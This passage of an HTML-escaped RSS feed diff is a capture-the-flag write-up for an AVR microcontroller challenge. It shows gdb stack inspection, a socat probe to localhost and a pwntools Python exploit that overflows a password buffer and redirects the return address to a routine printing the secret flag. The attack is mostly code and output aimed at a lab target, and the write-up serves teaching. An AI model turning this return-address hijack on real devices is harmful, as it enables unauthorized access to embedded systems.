+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;27		&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UCSR0A &amp;amp; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&amp;lt;&amp;lt;RXC0&lt;span style=&#34;color:#f92672&#34;&gt;)))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{}&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; bt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#0  0x000001fa in uart_get () at uart.c:27&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#1  0x00000376 in passwd_check () at main.c:45&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#2  0x0000045c in main () at main.c:66&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; frame &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#1  0x00000376 in passwd_check () at main.c:45&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;45			buff&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; uart_get&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; x/30xh $sp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x8021dc:	0x00bb	0x0000	0x0000	0x0000	0x0000	0x0000	0x0000	0x0000
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x8021ec:	0x0000	0x0000	0x0000	0x0000	0x2100	0x00f9	0x2e02	0x2100
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x8021fc:	0x00ff	0x9d00	Cannot access memory at address 0x802200
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Remember called address is not the same as memory address. Thus, divide the frame return address by 2 (&lt;code&gt;hex(0x45c // 2) == 0x22e&lt;/code&gt;. We can see that FP, which is located just above return address, would be &lt;code&gt;0xf900&lt;/code&gt; if return address was 2 bytes, which is an invalid stack frame pointer. It makes much more sense to think return address is 3 bytes, as FP would be &lt;code&gt;0x21f9&lt;/code&gt; in this case (remember that stack base is &lt;code&gt;0x21ff&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;Now, continue the process in gdb and write some data to UART (not too much, stack frame is close to the stack base), then check the stack layout after the &lt;code&gt;cli&lt;/code&gt; instruction.&lt;/p&gt;
+&lt;p&gt;In shell:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;socat exec:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;python3 -c \&amp;#34;print(&amp;#39;A&amp;#39;*19 + &amp;#39;BBCC&amp;#39;)\&amp;#34;&amp;#34;&lt;/span&gt; tcp:localhost:1337
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Check back the stack to see &lt;code&gt;&amp;quot;BBC&amp;quot;&lt;/code&gt; (&lt;code&gt;0x424243&lt;/code&gt;) get written to the return address.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Program received signal SIGTRAP, Trace/breakpoint trap.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x00000428 in passwd_check &lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; at main.c:57
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;57	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; x/30xh $sp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x8021dc:	0x11bb	0x5900	0x0b00	0x0001	0x4141	0x4141	0x4141	0x4141
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x8021ec:	0x4141	0x4141	0x4141	0x4141	0x4141	0x4241	0x4342	0x0043
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x8021fc:	0x00ff	0x9d00	Cannot access memory at address 0x802200
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now that we know how many bytes to overflow and how many bytes is the return address. Let&amp;rsquo;s build the exploit.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; argparse
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arch &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;avr&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;bits &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;endian &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    parser &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; argparse&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ArgumentParser()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    parser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_argument(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;host&amp;#39;&lt;/span&gt;, type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;str, help&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Target host&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    parser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_argument(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;port&amp;#39;&lt;/span&gt;, type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;int, help&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Target port&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    args &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; parser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parse_args()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;host
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;port
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    get_secret_address_ea &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x169&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    uart_puts_p_ea &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x135&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    reset_handler_ea &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(host, port)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p16(get_secret_address_ea)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p16(uart_puts_p_ea)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# uncomment following line to correctly terminate exploit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# it is not prepended with b&amp;#39;\x00&amp;#39; because the &amp;#39;\n&amp;#39; sent&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# by `sendline` will be overwritten by the program with a &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# null byte, we cannot inject it ourself because it would&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# write the &amp;#39;\n&amp;#39; out of stack memory limit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;#payload += p16(reset_handler_ea)   &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ans &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag:&amp;#39;&lt;/span&gt;, ans&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag:&amp;#39;&lt;/span&gt;, ans)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running it give us the flag:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ python3 exploit.py localhost &lt;span style=&#34;color:#ae81ff&#34;&gt;4000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Opening connection to localhost on port 4000: Done
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Closed connection to localhost port &lt;span style=&#34;color:#ae81ff&#34;&gt;4000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag: FCSC&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;__REDACTED__&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+    </item>
+    
+  </channel>
+</rss>
